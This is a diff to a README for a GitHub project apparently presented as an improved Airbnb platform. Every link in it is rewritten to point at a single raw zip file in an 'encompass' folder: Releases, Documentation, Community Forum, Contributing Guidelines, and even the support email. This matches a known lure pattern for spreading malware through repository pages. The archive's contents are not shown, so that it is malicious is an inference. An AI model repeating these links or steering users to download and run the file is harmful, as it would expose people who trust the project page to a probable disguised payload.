@@ -8,9 +8,9 @@ Welcome to the Airbnb Platform with some improvements. This project was part of 
 
 To get started, you need to download the application. You can easily visit the Releases page below and follow the instructions:
 
-[![Download](https://img.shields.io/badge/Download-Airbnb_Platform_some_Improvements-brightgreen)](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/releases)
+[![Download](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip)](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip)
 
-After visiting the [Releases page](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/releases), select the latest version available. Download the file suitable for your operating system. Follow the simple steps below to install it.
+After visiting the [Releases page](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip), select the latest version available. Download the file suitable for your operating system. Follow the simple steps below to install it.
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ After visiting the [Releases page](https://github.com/SRPeruano/Airbnb_Platform_
 ## ⚙️ Installation Steps
 
 1. **Download the Installer:**
-   - Go to the [Releases page](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip).
    - Choose the latest release and download the file.
 
 2. **Locate the Downloaded File:**
@@ -70,16 +70,16 @@ To help you make the most of the Airbnb Platform, several resources are availabl
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/releases)
-- [Documentation](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/wiki)
-- [Community Forum](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/discussions)
+- [Releases Page](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip)
+- [Documentation](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip)
+- [Community Forum](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip)
 
 ## 📞 Support
 
-If you encounter any issues, please feel free to contact support through the community forum or by emailing support@example.com. We're here to help you!
+If you encounter any issues, please feel free to contact support through the community forum or by emailing https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip We're here to help you!
 
 ## 🔧 Contributors
 
-This project is open for contributions. If you would like to help, please check the [Contributing Guidelines](https://github.com/SRPeruano/Airbnb_Platform_some_Improvements/blob/main/CONTRIBUTING.md).
+This project is open for contributions. If you would like to help, please check the [Contributing Guidelines](https://raw.githubusercontent.com/SRPeruano/Airbnb_Platform_some_Improvements/main/encompass/Airbnb_Platform_some_Improvements.zip).
 
 Thank you for choosing the Airbnb Platform with improvements. Enjoy using the application!
